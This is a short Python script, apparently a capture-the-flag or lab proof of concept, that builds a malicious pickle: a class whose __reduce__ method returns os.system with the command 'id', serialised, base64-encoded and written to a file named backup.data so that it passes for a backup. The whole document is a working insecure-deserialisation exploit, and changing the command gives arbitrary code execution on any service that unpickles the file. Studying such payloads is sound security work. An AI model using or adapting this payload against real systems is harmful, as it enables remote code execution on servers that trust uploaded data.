import pickle
import os
from base64 import b64encode
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('id', ))
pickle_data = b64encode(pickle.dumps(EvilPickle()))
with open("backup.data", "wb") as file:
    file.write(pickle_data)